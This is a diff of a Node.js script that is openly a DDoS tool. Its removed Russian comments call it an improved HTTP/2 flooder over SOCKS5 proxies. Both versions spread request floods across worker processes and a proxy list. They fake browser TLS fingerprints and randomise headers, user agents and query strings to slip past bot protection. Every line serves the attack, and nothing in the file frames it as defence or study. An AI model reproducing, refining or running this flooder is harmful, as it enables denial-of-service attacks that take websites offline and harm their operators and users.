@@ -1,6 +1,3 @@
-// socksfingerprint-improved.js
-// Улучшенная версия HTTP/2 флудера через SOCKS5 с максимальной имитацией браузера (2025)
-
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -11,202 +8,212 @@ const { SocksClient } = require("socks");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
+process.on('uncaughtException', function (exception) {});
 
-// Игнорируем только некритичные ошибки
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
+if (process.argv.length < 7){
+    console.log(`node socks.js target time rate thread proxyfile`);
+    process.exit();
+}
 
-if (process.argv.length < 7) {
-    console.log(`Использование: node socksfingerprint-improved.js <target> <time> <rate> <threads> <proxyfile>`);
-    console.log(`Пример: node socksfingerprint-improved.js https://example.com 60 100 10 proxies.txt`);
-    process.exit(1);
+function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+}
+
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randomString(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
 }
 
 const args = {
     target: process.argv[2],
-    time: parseInt(process.argv[3]),
-    rate: parseInt(process.argv[4]),
-    threads: parseInt(process.argv[5]),
+    time: ~~process.argv[3],
+    Rate: ~~process.argv[4],
+    threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 };
 
-if (!args.target.startsWith('https://')) {
-    console.log('Цель должна быть HTTPS!');
-    process.exit(1);
-}
-
+var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
-const proxies = fs.readFileSync(args.proxyFile, "utf-8")
-    .split(/\r?\n/)
-    .filter(line => line.trim().length > 0 && line.includes(':'));
 
-// Реалистичные User-Agent'ы Chrome/Firefox 2025 года
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
-];
-
-const acceptLanguages = [
-    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
-    "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9", "zh-CN,zh;q=0.9"
-];
-
-const secChUa = [
-    `"Google Chrome";v="132", "Chromium";v="132", "Not=A?Brand";v="99"`,
-    `"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="99"`,
-    `"Firefox";v="135"`, `"Firefox";v="134"`
-];
-
-// Современные cipher suites + порядок как в Chrome 132
-const ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
-
-function randElement(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
-}
-
-function shuffleArray(array) {
-    for (let i = array.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [array[i], array[j]] = [array[j], array[i]];
+if (cluster.isMaster) {
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
     }
-    return array;
+} else {
+    setInterval(runFlooder, 0);
 }
 
-function buildHeaders() {
-    const path = parsedTarget.path === '/' ? '/' : parsedTarget.path;
-    const query = `?${Math.random().toString(36).substring(2, 15)}=${Math.random().toString(36).substring(2, 15)}`;
-    
-    let headers = {
-        ":method": "GET",
-        ":authority": parsedTarget.host,
-        ":scheme": "https",
-        ":path": path + query,
-        "user-agent": randElement(userAgents),
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": randElement(acceptLanguages),
-        "sec-fetch-site": randElement(["same-origin", "same-site", "cross-site", "none"]),
-        "sec-fetch-mode": randElement(["navigate", "no-cors", "cors"]),
-        "sec-fetch-dest": randElement(["document", "empty"]),
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "priority": "u=0, i",
-        "cache-control": randElement(["no-cache", "max-age=0"]),
-        "pragma": "no-cache",
-        "te": "trailers"
-    };
+class NetSocket {
+    constructor(){}
 
-    // Добавляем sec-ch-ua только для Chrome
-    if (headers["user-agent"].includes("Chrome")) {
-        headers["sec-ch-ua"] = randElement(secChUa.filter(u => u.includes("Chrome")));
-        headers["sec-ch-ua-mobile"] = "?0";
-        headers["sec-ch-ua-platform"] = randElement(['"Windows"', '"macOS"', '"Linux"']);
-    }
-
-    if (Math.random() > 0.6) headers["referer"] = randElement(["https://www.google.com/", "https://www.bing.com/", ""]);
-
-    // Рандомизируем порядок заголовков
-    const headerEntries = Object.entries(headers);
-    shuffleArray(headerEntries);
-    const shuffledHeaders = {};
-    for (const [key, value] of headerEntries) {
-        shuffledHeaders[key] = value;
-    }
-
-    return shuffledHeaders;
-}
-
-function createConnection(proxyAddr, callback) {
-    const [host, port] = proxyAddr.replace('socks5://', '').split(':');
-
-    const socksOptions = {
-        proxy: { host, port: parseInt(port), type: 5 },
-        command: 'connect',
-        destination: { host: parsedTarget.host, port: 443 },
-        timeout: 10000
-    };
-
-    SocksClient.createConnection(socksOptions, (err, info) => {
-        if (err || !info?.socket) return callback(null);
-        const socket = info.socket;
-        socket.setKeepAlive(true, 60000);
-        socket.setTimeout(15000);
-        callback(socket);
-    });
-}
-
-function runFlood() {
-    const proxy = randElement(proxies);
-    if (!proxy) return;
-
-    createConnection(proxy, (connection) => {
-        if (!connection) return;
-
-        const tlsOptions = {
-            socket: connection,
-            ALPNProtocols: ['h2'],
-            servername: parsedTarget.host,
-            rejectUnauthorized: false,
-            ciphers: ciphers,
-            sigalgs: "RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA256:ECDSA+SHA384",
-            minVersion: "TLSv1.2",
-            maxVersion: "TLSv1.3",
-            curves: "X25519:P-256:P-384:P-521",
-            ecdhCurve: "X25519:P-256:P-384",
-            honorCipherOrder: false
+    SOCKS5(options, callback) {
+        const proxyParts = options.proxy.replace('socks5://', '').split(':');
+        const socksOptions = {
+            proxy: {
+                host: proxyParts[0],
+                port: parseInt(proxyParts[1]),
+                type: 5
+            },
+            command: 'connect',
+            destination: {
+                host: options.address.split(':')[0],
+                port: 443
+            },
+            timeout: options.timeout
         };
 
-        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
+        SocksClient.createConnection(socksOptions, (err, info) => {
+            if (err) {
+                return callback(undefined, "error: " + err);
+            }
+            const connection = info.socket;
+            connection.setKeepAlive(true, 60000);
+            return callback(connection, undefined);
+        });
+    }
+}
 
-        const client = http2.connect(args.target, {
-            createConnection: () => tlsSocket,
+const fetch_site = ["same-origin", "same-site", "cross-site"];
+const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
+const fetch_dest = ["document", "sharedworker", "worker"];
+
+const languages = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8",
+    "es-ES,es;q=0.9",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "ja-JP,ja;q=0.9,en;q=0.8"
+];
+const useragents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
+];
+const referers = [
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://duckduckgo.com/",
+    "https://www.yahoo.com/",
+    "https://www.baidu.com/",
+    parsedTarget.href
+];
+
+const Header = new NetSocket();
+
+function buildHeaders() {
+    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
+    const rand_path = (parsedTarget.path || "/") + rand_query;
+
+    const headers = {
+        ":method": "GET",
+        ":path": rand_path,
+        ":authority": parsedTarget.host,
+        ":scheme": "https",
+        "user-agent": randomElement(useragents),
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "accept-language": randomElement(languages),
+        "accept-encoding": "gzip, deflate, brz zstd",
+        "referer": randomElement(referers),
+        "upgrade-insecure-requests": "1",
+        "sec-fetch-dest": randomElement(fetch_dest),
+        "sec-fetch-mode": randomElement(fetch_mode),
+        "sec-fetch-site": randomElement(fetch_site)
+    };
+    if (Math.random() > 0.5) {
+        headers["dnt"] = "1";
+    }
+    if (Math.random() > 0.5) {
+        headers["sec-fetch-user"] = "?1";
+    }
+    if (Math.random() > 0.5) {
+        headers["te"] = "trailers";
+    }
+    return headers;
+}
+
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    if (!proxyAddr || !proxyAddr.includes(":")) return;
+
+    const proxyOptions = {
+        proxy: proxyAddr,
+        address: parsedTarget.host + ":443",
+        timeout: 500000
+    };
+
+    Header.SOCKS5(proxyOptions, (connection, error) => {
+        if (error) return;
+
+        connection.setKeepAlive(true, 60000);
+
+        const tlsOptions = {
+            ALPNProtocols: ['h2'],
+            rejectUnauthorized: false,
+            socket: connection,
+            servername: parsedTarget.host,
+            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
+            sigalgs: "ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512",
+            curves: "X25519:P-256:P-384",
+            ecdhCurve: "X25519:P-256:P-384",
+            minVersion: "TLSv1.2",
+            maxVersion: "TLSv1.3"
+        };
+
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
             settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 64,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 262144,
-                enablePush: false
+                maxConcurrentStreams: 30,
+                initialWindowSize: 65535,
+                enablePush: false,
             },
-            maxSessionMemory: 64000
+            maxSessionMemory: 32000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
         });
 
-        let attackInterval = null;
-
-        client.once("connect", () => {
-            attackInterval = setInterval(() => {
-                for (let i = 0; i < args.rate; i++) {
-                    const req = client.request(buildHeaders());
-                    req.on("response", () => req.close());
-                    req.on("error", () => {});
-                    req.end();
+        client.on("connect", () => {
+            setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const headers = buildHeaders();
+                    const request = client.request(headers);
+                    request.on("response", () => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+                    request.end();
                 }
             }, 1000);
         });
-
-        const closeAll = () => {
-            if (attackInterval) clearInterval(attackInterval);
+        client.on("close", () => {
             client.destroy();
-            tlsSocket.destroy();
             connection.destroy();
-        };
-
-        client.on("error", closeAll);
-        client.on("close", closeAll);
-        tlsSocket.on("error", closeAll);
-        tlsSocket.on("timeout", closeAll);
-        tlsSocket.on("end", closeAll);
+        });
     });
 }
 
-if (cluster.isMaster) {
-    console.log(`[Improved Flooder] Атака на ${args.target} | Время: ${args.time}s | RPS/поток: ${args.rate} | Потоков: ${args.threads}`);
-    for (let i = 0; i < args.threads; i++) cluster.fork();
-    setTimeout(() => process.exit(0), args.time * 1000);
-} else {
-    setInterval(runFlood, 1); // максимально быстро
-}
+const KillScript = () => process.exit(1);
+setTimeout(KillScript, args.time * 1000);
